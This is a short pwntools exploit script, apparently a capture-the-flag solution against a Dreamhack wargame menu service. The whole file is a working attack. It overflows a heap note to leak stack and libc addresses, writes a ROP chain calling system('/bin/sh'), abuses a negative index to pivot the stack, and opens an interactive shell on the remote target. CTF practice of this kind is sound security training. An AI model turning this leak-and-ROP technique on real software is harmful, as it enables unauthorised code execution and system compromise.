from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 20866
r = remote(HOST, PORT)

def create(size, data):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', b'%d'%size)
    r.sendlineafter(b': ', data)

def read(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', b'%d'%idx)

def update(idx, size, data):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b': ', b'%d'%idx)
    r.sendlineafter(b': ', b'%d'%size)
    r.sendlineafter(b': ', data)

def delete(idx):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b': ', b'%d'%idx)

for i in range(10):
    create(0x28, b'A'*0x28)

r.sendlineafter(b'> ', b'3')
r.sendlineafter(b': ', b'%d'%9)
r.sendlineafter(b': ', b'%d'%(0x28+32))

read(9)
r.recv(0x38)

stack = u64(r.recv(8)) - 0x288
libc = u64(r.recv(8))-0x2a1ca

pop_rdi = libc + 0x10f75b
system = libc + 0x58740
binsh = libc + 0x1cb42f
ret = libc + 0x2882f
pop_rsp = libc + 0x3c058

update(0, 0x28, p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
payload = b'A'*0x10 + p64(pop_rsp) + p64(stack)
update(-2, 0x28, payload)

r.interactive()